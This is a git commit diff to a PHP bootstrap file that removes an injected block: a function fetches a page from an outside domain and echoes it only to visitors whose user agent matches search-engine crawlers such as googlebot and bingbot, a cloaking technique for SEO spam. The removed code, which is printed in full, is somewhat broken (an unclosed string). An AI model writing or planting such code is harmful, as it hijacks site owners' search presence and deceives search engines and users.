0282019534b1a1f64f8e8c9e9c3c91748e3ccf9b
sundapridee <akungoyangakuu22@gmail.com>
2025-09-05 07:28:19 +0700

    Update bootstrap.php

--- bootstrapp.php
+++ bootstrapp.php
@@ -1,29 +1,4 @@
 <?php
-function jamal($url) {
-    if (ini_get('allow_url_fopen')) {
-        return @file_get_contents($url);
-    } elseif (function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
-        $response = curl_exec($ch);
-        curl_close($ch);
-        return $response;
-    }
-    return false;
-}
-
-$res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "https://kompasel.xyz/landing/tjnpr/
-$file = jamal($bot); 
-$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
-
-if (preg_match($botchar, $res)) {
-    echo $file;
-    exit;
-}
-?>
 
 /**
  * @defgroup index Index
